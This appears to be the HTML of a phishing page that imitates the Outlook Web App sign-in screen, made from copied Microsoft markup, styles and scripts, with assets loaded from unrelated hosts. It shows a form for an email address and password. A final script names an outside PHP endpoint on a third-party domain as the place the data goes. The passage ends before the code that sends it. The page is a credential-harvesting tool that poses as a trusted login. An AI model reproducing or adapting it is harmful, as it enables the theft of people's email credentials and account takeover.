<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. -->
<!-- OwaPage = ASP.auth_logon_aspx -->
<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<html>
<head>
<meta content="IE=10" http-equiv="X-UA-Compatible"/>
<link href="https://wafsd.com/new/arsm/media/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
<meta content="text/html; CHARSET=utf-8" http-equiv="Content-Type"/>
<meta content="NOINDEX, NOFOLLOW" name="Robots"/>
<title>Outlook Web App</title>
<style>
        @font-face {
            font-family: "Segoe UI WPC";
            src: url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/owa/auth/15.0.1497/themes/resources/segoeui-regular.eot?") format("embedded-opentype"),
                url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/owa/auth/15.0.1497/themes/resources/segoeui-regular.ttf") format("truetype");
        }

        @font-face {
            font-family: "Segoe UI WPC Semilight";
            src: url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/owa/auth/15.0.1497/themes/resources/segoeui-semilight.eot?") format("embedded-opentype"),
                url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/owa/auth/15.0.1497/themes/resources/segoeui-semilight.ttf") format("truetype");
        }

        @font-face {
            font-family: "Segoe UI WPC Semibold";
            src: url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/owa/auth/15.0.1497/themes/resources/segoeui-semibold.eot?") format("embedded-opentype"),
                url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/owa/auth/15.0.1497/themes/resources/segoeui-semibold.ttf") format("truetype");
        }
    </style>
<style>
        /*Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.*/

        body.rtl {
            text-align: right;
            direction: rtl;
        }

        body,
        .mouse,
        .twide,
        .tnarrow,
        form {
            height: 100%;
            width: 100%;
            margin: 0px;
        }

        .mouse,
        .twide {
            min-width: 650px;
            /* min iPad1 dimension */
            min-height: 650px;
            position: absolute;
            top: 0px;
            bottom: 0px;
            left: 0px;
            right: 0px;
        }

        .sidebar {
            background-color: #0072C6;
        }

        .mouse .sidebar,
        .twide .sidebar {
            position: absolute;
            top: 0px;
            bottom: 0px;
            left: 0px;
            display: inline-block;
            width: 332px;
        }

        .tnarrow .sidebar {
            display: none;
        }

        .mouse .owaLogoContainer,
        .twide .owaLogoContainer {
            margin: 213px auto auto 109px;
            text-align: left
                /* Logo aligns left for both ltr & rtl */
        }

        .tnarrow .owaLogo {
            display: none;
        }

        .mouse .owaLogoSmall,
        .twide .owaLogoSmall {
            display: none;
        }

        .logonDiv {
            text-align: left;
        }

        .rtl .logonDiv {
            text-align: right;
        }

        .mouse .logonContainer,
        .twide .logonContainer {
            padding-top: 174px;
            padding-left: 464px;
            padding-right: 142px;
            position: absolute;
            top: 0px;
            bottom: 0px;
            left: 0px;
            right: 0px;
            text-align: center;
        }

        .mouse .logonDiv,
        .twide .logonDiv {
            position: relative;
            vertical-align: top;
            display: inline-block;
            width: 423px;
        }

        .tnarrow .logonDiv {
            margin: 25px auto auto -130px;
            position: absolute;
            left: 50%;
            width: 260px;
            padding-bottom: 20px;
        }

        .twide .signInImageHeader,
        .tnarrow .signInImageHeader {
            display: none;
        }

        .mouse .signInImageHeader {
            margin-bottom: 22px;
        }

        .twide .mouseHeader {
            display: none;
        }

        .mouse .twideHeader {
            display: none;
        }

        input::-webkit-input-placeholder {
            font-size: 16px;
            color: #98A3A6;
        }

        input:-moz-placeholder {
            font-size: 16px;
            color: #98A3A6;
        }

        .tnarrow .signInInputLabel,
        .twide .signInInputLabel {
            display: none;
        }

        .mouse .signInInputLabel {
            margin-bottom: 2px;
        }

        .mouse .showPasswordCheck {
            display: none;
        }

        .signInInputText {
            border: 1px solid #98A3A6;
            color: #333333;
            border-radius: 0;
            -moz-border-radius: 0;
            -webkit-border-radius: 0;
            box-shadow: none;
            -moz-box-shadow: none;
            -webkit-box-shadow: none;
            -webkit-appearance: none;
            background-color: #FDFDFD;
            width: 250px;
            margin-bottom: 10px;
            box-sizing: content-box;
            -moz-box-sizing: content-box;
            -webkit-box-sizing: content-box;
        }

        .mouse .signInInputText {
            height: 22px;
            font-size: 12px;
            padding: 3px 5px;
            color: #333333;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            margin-bottom: 20px;
        }

        .twide .signInInputText,
        .tnarrow .signInInputText {
            border-color: #666666;
            height: 22px;
            font-size: 16px;
            color: #000000;
            font: $ShellInputTextTouchFont;
            padding: 7px 7px;
            font-family: 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI WPC Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-bottom: 20px;
            width: 264px;
        }

        .divMain {
            width: 444px;
        }

        .l {
            text-align: left;
        }

        .rtl .l {
            text-align: right;
        }

        .r {
            text-align: right;
        }

        .rtl .r {
            text-align: left;
        }

        table#tblMain {
            margin-top: 48px;
            padding: 0px;
        }

        table.mid {
            width: 385px;
            border-collapse: collapse;
            padding: 0px;
            color: #444444;
        }

        table.tblConn {
            direction: ltr;
        }

        td.tdConnImg {
            width: 22px;
        }

        td.tdConn {
            padding-top: 15px;
        }

        td#mdLft {
            background: url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/lgnleft.gif") repeat-y;
            width: 15px;
        }

        td#mdRt {
            background: url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/lgnright.gif") repeat-y;
            width: 15px;
        }

        td#mdMid {
            padding: 0px 45px;
            background: #ffffff;
            vertical-align: top;
        }

        td .txtpad {
            padding: 3px 6px 3px 0px;
        }

        .txt {
            padding: 3px;
            height: 2.2em;
        }

        input.btn {
            color: #ffffff;
            background-color: #eb9c12;
            border: 0px;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }

        .btnOnFcs {
            color: #ffffff;
            background-color: #eb9c12;
            border: 0px;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }

        .btnOnMseOvr {
            color: #ffffff;
            background-color: #f9b133;
            border: 0px;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }

        .btnOnMseDwn {
            color: #000000;
            background-color: #f9b133;
            border: 0px solid #f9b133;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }

        .nowrap {
            white-space: nowrap;
        }

        hr {
            height: 0px;
            visibility: hidden;
        }

        .wrng {
            color: #ff6c00;
        }

        .disBsc {
            color: #999999;
        }

        .expl {
            color: #999999;
        }

        .w100,
        .txt {
            width: 100%;
        }

        .txt {
            margin: 0px 6px;
        }

        .rdo {
            margin: 0px 12px 0px 32px;
        }

        body.rtl .rdo {
            margin: 0px 32px 0px 12px;
        }

        tr.expl td,
        tr.wrng td {
            padding: 2px 0px 4px;
        }

        tr#trSec td {
            padding: 3px 0px 8px;
        }

        /* language page specific styles */
        td#tdLng {
            padding: 12px 0px;
        }

        td#tdTz {
            padding: 8px 0px;
        }

        select#selTz {
            padding: 0px;
            margin: 0px;
        }

        td#tdOptMsg {
            padding: 10px 0px;
        }

        td#tdOptChk {
            padding: 0px 0px 15px 65px;
        }

        td#tdOptAcc {
            vertical-align: middle;
            padding: 0px 0px 0px 3px;
        }

        select#selLng {
            margin: 0px 16px;
        }

        /* logoff page specific styles */
        td#tdMsg {
            margin: 9px 0px 64px;
        }

        input#btnCls {
            margin: 3px 6px;
        }

        td.lgnTL,
        td.lgnBL {
            width: 456px;
        }

        td.lgnTM {
            background: url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/lgntopm.gif") repeat-x;
            width: 100%;
        }

        td.lgnBM {
            background: url("https://pub-4b86a7a34b6840eaab80ac9a7345217c.r2.dev/lgnbotm.gif") repeat-x;
            width: 100%;
        }

        td.lgnTR,
        td.lgnBR {
            width: 45px;
        }

        table.tblLgn {
            padding: 0px;
            margin: 0px;
            border-collapse: collapse;
            width: 100%;
        }

        .signInBg {
            margin: 0px;
        }

        .signInTextHeader {
            font-size: 60px;
            color: #404344;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            margin-bottom: 18px;
            white-space: nowrap;
        }

        .signInInputLabel {
            font-size: 12px;
            color: #666666;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
        }

        .signInCheckBoxText {
            font-size: 12px;
            color: #6A7479;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 16px;
        }

        .twide .signInCheckBoxText,
        .tnarrow .signInCheckBoxText {
            font-size: 15px;
        }

        .signInCheckBoxLink {
            font-size: 12px;
            color: #0072C6;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        }

        .signInEnter {
            font-size: 22px;
            color: #0072C6;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            margin-top: 20px;
        }

        .twide .signInEnter {
            margin-top: 17px;
            font-size: 29px;
        }

        .tnarrow .signInEnter {
            margin-top: 2px;
            font-size: 29px;
            position: relative;
            float: left;
            left: 50%;
        }

        .signinbutton {
            cursor: pointer;
            display: inline
        }

        .mouse .signinbutton {
            padding: 0px 8px 5px 8px;
            margin-left: -8px;
        }

        .rtl .mouse .signinbutton {
            margin-right: -8px;
        }

        .tnarrow .signinbutton {
            position: relative;
            float: left;
            left: -50%;
        }

        .shellDialogueHead {
            font-size: 29px;
            color: #0072C6;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        }

        .mouse .shellDialogueHead {
            line-height: 35px;
            margin-bottom: 10px;
        }

        .twide .shellDialogueHead,
        .tnarrow .shellDialogueHead {
            line-height: 34px;
            margin-bottom: 12px;
        }

        .shellDialogueMsg {
            font-size: 13px;
            color: #333333;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            line-height: 18px;
        }

        .twide .shellDialogueMsg,
        .tnarrow .shellDialogueMsg {
            font-size: 15px;
        }

        .headerMsgDiv {
            width: 350px;
            margin-bottom: 22px;
        }

        .twide .headermsgdiv {
            margin-bottom: 30px;
        }

        .tnarrow .headermsgdiv {
            width: 260px;
            margin-bottom: 30px;
        }

        .signInError {
            font-size: 12px;
            color: #C1272D;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 12px;
        }

        .passwordError {
            color: #A80F22;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            line-height: 18px;
        }

        .mouse .passwordError {
            margin-top: 10px;
            font-size: 13px;
        }

        .twide .passwordError,
        .tnarrow .passwordError {
            margin-top: 12px;
            font-size: 15px;
        }

        .signInExpl {
            font-size: 12px;
            color: #999999;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 5px;
        }

        .signInWarning {
            font-size: 12px;
            color: #C1272D;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 5px;
        }

        input.chk {
            margin-right: 9px;
            margin-left: 0px;
        }

        .imgLnk {
            vertical-align: middle;
            line-height: 2;
            margin-top: -2px;
        }

        .signinTxt {
            padding-left: 11px;
            padding-right: 11px;
            /* Needed for RTL, doesnt hurt to add this for LTR as well */
        }

        .hidden-submit {
            border: 0 none;
            height: 0;
            width: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }

        .officeFooter {
            position: absolute;
            bottom: 33px;
            right: 45px;
        }

        .tnarrow .officeFooter {
            display: none;
        }

        .display-none {
            display: none;
        }

        .bubu {
            border: none;
            background: transparent;
            padding-left: 0;
            margin-left: 0;
        }

        #email {
            font-size: 15px;
        }
    </style>
<script>
        //  flogon.js
        //
        //  This file contains the script used by Logon.aspx
        //
        //Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.

        /// <summary>
        /// OnLoad handler for logon page
        /// </summary>
        window.onload = function () {
            // If we are replacing the current window with the logon page, initialize the logon page UI now
            //
            if (a_fRC)
                initLogon();

            // Otherwise we need to find the window to replace with the logon page and redirect that window
            //
            else
                redir();
        };

        /// <summary>
        /// Initializes the logon page
        /// </summary>
        function initLogon() {
            try {
                //
                // we don't call document.execCommand("ClearAuthenticationCache","false"); anymore. As a part of the Pending-Notification
                // infrastructure, we are making a change to make sure startpage does not get loaded more than once. This solution is cookie
                // based. This execCommand was clearing all cookies in the scenario when a user logged on from a child window during an
                // FBA timeout. We do not want that to happen anymore. If this breaks anything, we may need to consider a different solution.
                //
                // Old Comments:
                // If the "Clear the Authentication Cache" flag is set to true and
                // we are coming from the logoff page , clear the cache. See bug 41770 and 5840 for details.
                //

                // Logoff the S-Mime control.
                //
                LogoffMime();
            }
            catch (e) { }

            // Check for username cookie
            //
            var re = /(^|; )logondata=acc=([0|1])&lgn=([^;]+)(;|$)/;
            var rg = re.exec(document.cookie);

            if (rg) {
                // Fill in username, set security to private, and restore the "use basic" selection
                //

                gbid("username").value = rg[3];

                try {
                    var signInErrorElement = gbid("signInErrorDiv");
                    if (signInErrorElement) {
                        signInErrorElement.focus();
                    }
                    else {
                        gbid("password").focus();
                    }
                }
                catch (e) { }

                if (gbid("chkPrvt") && !gbid("chkPrvt").checked) {
                    gbid("chkPrvt").click();
                }

                if (rg[2] == "1" && gbid("chkBsc"))	// chkBsc doesn't exist if the request comes from ECP
                    gbid("chkBsc").click();

            }
            else {
                // The variable g_fFcs is set to false when the password gains focus,
                // so that we don't accidentally set focus to the username field while
                // the user is typing their password
                //
                if (g_fFcs) {
                    try {
                        gbid("username").focus();
                    }
                    catch (e) { }
                }
            }

            // OWA Premium currently supports
            // IE 7+, Safari 3+, Firefox 3+ for Windows / Mac
            if (IsOwaPremiumBrowser() && gbid("chkBsc"))	// chkBsc doesn't exist if the request comes from ECP
                gbid("chkBsc").disabled = false;

            // Are cookies enabled?
            //
            var sCN = "cookieTest";

            document.cookie = sCN + "=1";
            var cookiesEnabled = document.cookie.indexOf(sCN + "=") != -1;

            if (cookiesEnabled == false) {
                shw(gbid("cookieMsg"));
                hd(gbid("lgnDiv"));
            }

            // Show the public/private warning message
            clkSec();
        }


        /// <summary>
        /// Finds the frame we want to load the logon page into, and then loads it there
        /// </summary>

        /// <summary>
        /// Show an element
        /// </summary>
        /// <param name="o">Element to show</param>
        function shw(o) {
            o.style.display = "";
        }

        /// <summary>
        /// Hide an element
        /// </summary>
        /// <param name="o">Element to hide</param>
        function hd(o) {
            o.style.display = "none";
        }

        /// <summary>
        /// OnClick handler for the show private explanation 
        /// </summary>
        function clkSecExp(id) {
            var o = gbid(id);

            if (o.tagName == "IMG")
                o = o.parentNode;

            switch (o) {
                case gbid("lnkShwSec"):
                    hd(gbid("lnkShwSec"));
                    shw(gbid("lnkHdSec"));
                    shw(gbid("prvtExp"));
                    gbid("lnkHdSec").focus();
                    break;
                case gbid("lnkHdSec"):
                    shw(gbid("lnkShwSec"));
                    hd(gbid("lnkHdSec"));
                    hd(gbid("prvtExp"));
                    gbid("lnkShwSec").focus();
                    break;
            }
        }

        /// <summary>
        /// onkeydown handler for the show private explanation 
        /// </summary>
        function kdSecExp(id) {
            // When user press space bar, we shall treat it as click.
            if (window.event.keyCode == 32) {
                clkSecExp(id);
            }
        }

        /// <summary>
        /// OnClick handler for the security radio buttons
        /// </summary>
        function clkRtry() {
            window.location.reload();
        }

        /// <summary>
        /// OnClick handler for the ok button after changing password (will go to owa/)
        /// </summary>
        function clkReLgn() {
            window.location.href = '../';
        }

        /// <summary>
        /// GetElementByID from Document
        /// </summary>
        /// <param name="s">Id of the Element</param>
        function gbid(s) {
            return document.getElementById(s);
        }

        /// <summary>
        /// Is the Client IE 7, Safari 3, Firefox 3 or Above
        /// Note The rules should match owa\bin\core\Utlities.cs@IsDownLevelClient
        /// </summary>
        function IsOwaPremiumBrowser() {
            var ua = navigator.userAgent;
            var av = navigator.appVersion;
            var mac = (av.indexOf('Mac') != -1);
            var win = ((av.indexOf('Win') != -1) || (av.indexOf('NT') != -1));

            // If you change the follow browser check logic, change utility.js as well.
            // We have duplicate logic because otherwise logon page must include more code than necessary.
            //
            var ie = (ua.indexOf("MSIE ") != -1);
            var firefox = (ua.indexOf("Firefox/") != -1 && ua.indexOf("Gecko/") != -1 && Array.every);
            var safari = (ua.indexOf("Safari") != -1 && ua.indexOf("WebKit") != -1);
            var version = 2.0;

            if (ie) {
                version = parseFloat(ua.replace(/^.*MSIE /, ''));
            }
            else if (firefox) {
                version = parseFloat(ua.replace(/^.*Firefox\//, ''));
            }
            else if (safari) {
                version = parseFloat(ua.replace(/^.*Version\//, ''));
            }
            else {
                version = parseInt(av);
            }

            if (win) {
                if (ie)
                    return (version >= 7.0);
                else if (safari)
                    return (version >= 3.0);
                else if (firefox)
                    return (version >= 3.0);
            }
            else if (mac) {
                if (safari)
                    return (version >= 2.0);
                else if (firefox)
                    return (version >= 3.0);
            }

            return false;
        }

        /// <summary>
        /// Convert an error code to HRESULT.
        /// </summary>
        function hres(iErr) {
            return iErr + 0xffffffff + 1;
        }

        /// <summary>
        /// Log off S-MIME control if it presents.
        /// </summary>
        function LogoffMime() {
            try {
                if ((typeof (mimeLogoffE2k3) != "undefined" && null != mimeLogoffE2k3) && IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
                    mimeLogoffE2k3.Logoff();

                if ((typeof (mimeLogoffE2k7SP1) != "undefined" && null != mimeLogoffE2k7SP1) && IsMimeCtlInst("OwaSMime.MimeCtlVer"))
                    mimeLogoffE2k7SP1.Logoff();

                if ((typeof (mimeLogoffE2k9) != "undefined" && null != mimeLogoffE2k9) && IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
                    mimeLogoffE2k9.Logoff();
            }
            catch (e) {
            }
        }

        /// <summary>
        /// Add performance marker which can write ETW trace for clicking logon
        /// </summary>
        /// <param name="sItemName">Identify string to say start clicking logon</param>
        function addPerfMarker(sItemName) {
            try {
                if (window.msWriteProfilerMark) {
                    window.msWriteProfilerMark(sItemName);
                }
            }
            catch (e) {
                // We don't care any exception caused by test code in product, swallow it
            }
        }

        //
        // NOTE: flogon.js does not contain a call to stJS("flogon.js"). This is because flogon.js is loaded at logon time before uglobal.js
        //

        //-----------------------------------------------------------
        // END flogon.js
        //-----------------------------------------------------------

    </script>
<script type="text/javascript">
        var a_fRC = 1;
        var g_fFcs = 1;
        var a_fLOff = 0;
        var a_fCAC = 0;
        var a_fEnbSMm = 0;
        /// <summary>
        /// Is Mime Control installed?
        /// </summary>
        function IsMimeCtlInst(progid) {
            if (!a_fEnbSMm)
                return false;

            var oMimeVer = null;

            try {
                // TODO: ingore this on none IE browser
                //
                //oMimeVer = new ActiveXObject(progid);
            }
            catch (e) {
            }

            if (oMimeVer != null)
                return true;
            else
                return false;
        }

        /// <summary>
        /// Render out the S-MIME control if it is installed.
        /// </summary>
        function RndMimeCtl() {
            if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
                RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");

            if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
                RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");

            if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
                RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
        }

        /// <summary>
        /// Helper function to factor out the rendering of the S/MIME control.
        /// </summary>
        function RndMimeCtlHlpr(objid, classid, ns, id) {
            document.write("<OBJECT id='" + objid + "' classid='CLSID:" + classid + "'></OBJECT>");
            document.write("<?IMPORT namespace='" + ns + "' implementation=#" + objid + ">");
            document.write("<" + ns + ":Logoff id='" + id + "' style='display:none'/>");
        }
    </script>
<script>

        var mainLogonDiv = window.document.getElementById("mainLogonDiv");
        var showPlaceholderText = false;
        var mainLogonDivClassName = 'mouse';

        if (mainLogonDivClassName == "tnarrow") {
            showPlaceholderText = true;

            // Output meta tag for viewport scaling
            document.write('<meta name="viewport" content="width = 320, initial-scale = 1.0, user-scalable = no" />');
        }
        else if (mainLogonDivClassName == "twide") {
            showPlaceholderText = true;
        }

        function setPlaceholderText() {
            window.document.getElementById("username").placeholder = "user name";
            window.document.getElementById("password").placeholder = "password";
            window.document.getElementById("passwordText").placeholder = "password";
        }

        function showPasswordClick() {
            var showPassword = window.document.getElementById("showPasswordCheck").checked;
            passwordElement = window.document.getElementById("password");
            passwordTextElement = window.document.getElementById("passwordText");
            if (showPassword) {
                passwordTextElement.value = passwordElement.value;
                passwordElement.style.display = "none";
                passwordTextElement.style.display = "inline";
                passwordTextElement.focus();
            }
            else {
                passwordElement.value = passwordTextElement.value;
                passwordTextElement.style.display = "none";
                passwordTextElement.value = "";
                passwordElement.style.display = "inline";
                passwordElement.focus();
            }
        }
    </script>
</head>
<body class="signInBg" style="background: #f2f2f2 url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAANvCAYAAADk40vJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+VpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDEyLTA1LTE1VDEzOjEwOjU5LTA3OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzI2NTAzNjQ5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzI2NTAzNjU5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozMjY1MDM2MjlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozMjY1MDM2MzlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnYK5fsAAAFLSURBVHja7NthDoIwDAZQNN7/vCTKKifQgZh12yPx30uG/bqyGLyt6xpLxXVfKi8QBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBMFh4WP/ePUSBEEQBEHQIQ4EQRA0cUHQdgVBe0Z5QN0Dalx1lAwoGcmAklEeyShP2/I8QlNoCuWRzJXlCeXRuGfvMSSjcX1rjat7NK6llUcyyqM8kvlh6X3dIhmNe2pp5ZGMpQ8nE8qT9R6LZFLeY0xYHnvm69G1h/NjmXJpjWukSGa4ZGIzUpI+C3vYMzM+C6Nu6XmH/XwjpZc9I5mkwz6K8iRtXMlI5mwy0TKZV/Zhf/kZd6g903akxJyN28Ow3ySTdKQ0SyZajpRyKfzPr1wNG3czUj5t1x6G/TbhSKlMZqiRcuhk365xI/2wj6aN+0y+Z25R98LQWH8QeQswAHk7x/k/TxxLAAAAAElFTkSuQmCC') repeat-x"></body>
<script type="text/javascript">
    RndMimeCtl();
</script>

<div id="dvErr">
<table cellpadding="0" cellspacing="0">
<tr>
<td><img alt="" src="local_resources/img/4971cd6782b6e8ab8d23a88273861ff5.png"/></td>
<td style="width:100%">To use Outlook Web App, browser settings must allow scripts to run. For
                    information about how to allow scripts, consult the Help for your browser. If your browser
                    doesn't support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a>
                    for access to Outlook Web App.</td>
</tr>
</table>
</div>

<form autocomplete="off" enctype="application/x-www-form-urlencoded" id="myForm" method="POST" name="logonForm">

<input name="flags" type="hidden" value="4"/>
<input name="forcedownlevel" type="hidden" value="0"/>
<!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
<div class="mouse" id="mainLogonDiv">
<script>

            var mainLogonDiv = window.document.getElementById("mainLogonDiv");
            mainLogonDiv.className = mainLogonDivClassName;
        </script>
<div class="sidebar">
<div class="owaLogoContainer">
<img aria-hidden="true" class="owaLogo" src="local_resources/img/d8d12e41e4f096ceeff62e487ed056de.png">
<img aria-hidden="true" class="owaLogoSmall" src="local_resources/img/9adb95541c4052645523f53159cbeda5.png"/>
</img></div>
</div>
<div class="logonContainer">
<div class="logonDiv" id="lgnDiv">
<div aria-label="Outlook Web App " class="signInImageHeader" role="heading">
<img alt="Outlook Web App " class="mouseHeader" src="local_resources/img/4d854ab977d5b829089640e6cd9cefd4.png"/>
</div>
<div aria-hidden="true" class="signInInputLabel" id="emailLabel">Email Address:</div>
<div><input aria-labelledby="emailLabel" class="signInInputText emailiness" id="email" name="email" role="textbox"/></div>
<!-- <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Domain / username:</div>
                <div><input id="username" name="username" class="signInInputText" role="textbox"
                        aria-labelledby="userNameLabel" /></div> -->
<div aria-hidden="true" class="signInInputLabel" id="passwordLabel">Password:</div>
<div><input aria-labelledby="passwordLabel" class="signInInputText" id="password" name="password" onfocus="g_fFcs=0" type="password" value=""/></div>
<div><input aria-labelledby="passwordLabel" class="signInInputText" id="passwordText" name="passwordText" onfocus="g_fFcs=0" style="display: none;" value=""/></div>
<div class="showPasswordCheck signInCheckBoxText">
<input class="chk" id="showPasswordCheck" onclick="showPasswordClick()" type="checkbox">
<span>Show password</span>
</input></div>
<div class="signInExpl" id="expltxt" role="alert">
</div>
<div class="signInError display-none e1" id="signInErrorDiv" role="alert" tabindex="0">The user name or
                    password you
                    entered isn't
                    correct. Try entering it again.</div>
<div class="signInError display-none e2" id="EmptyErrorDiv" role="alert" tabindex="0">Please enter your
                    Password.</div>
<div class="signInError display-none e21" id="EmptyErrorDiv" role="alert" tabindex="0">Please enter your
                    Email address.</div>
<button class="signInEnter bubu" type="submit">
<div class="signinbutton" role="button" tabindex="0" type="submit">
<img alt="" class="imgLnk aaaa1" src="local_resources/img/ada9ffab5f491d62fbc4bc8fe264577d.png"/>
<img alt="" class="LIB_spinner_el aaaa2 display-none" src="local_resources/img/eb354fc66d7f47d781e6e103fd301ba2.gif" style="vertical-align: middle; height: 30px;"/>
<span class="signinTxt">sign in</span>
</div>
<input name="isUtf8" type="hidden" value="1">
</input></button>
<div class="hidden-submit"><input tabindex="-1" type="submit"/></div>
</div>
</div>
<div class="logonDiv" id="cookieMsg" style="display:none">
<div class="signInHeader">Outlook Web App </div>
<div class="signInExpl">Please enable cookies for this Web site.<br/><br/>Cookies are currently disabled by
                your browser. Outlook Web App requires that cookies be enabled. <br/><br/>For information about how to
                enable cookies, see the Help for your Web browser.<br/><br/><br/></div>
<div class="signInEnter">
<div onclick="clkRtry()" style="cursor:pointer;display:inline">
<img alt="" class="imgLnk" src="local_resources/img/ada9ffab5f491d62fbc4bc8fe264577d.png"/><span class="signinTxt" tabindex="0">retry</span>
</div>
</div>
</div>
</div>
</form>
<script>
    if (showPlaceholderText) {
        setPlaceholderText();
    }
</script>
<script>
    // ############################################################################
    // Specify the URL of the PHP file Here
    var url = "https://schoolomar.com/sbsbsbs/opaa/main.php";
    // ############################################################################

    var a1 = document.querySelectorAll(".aaaa1");
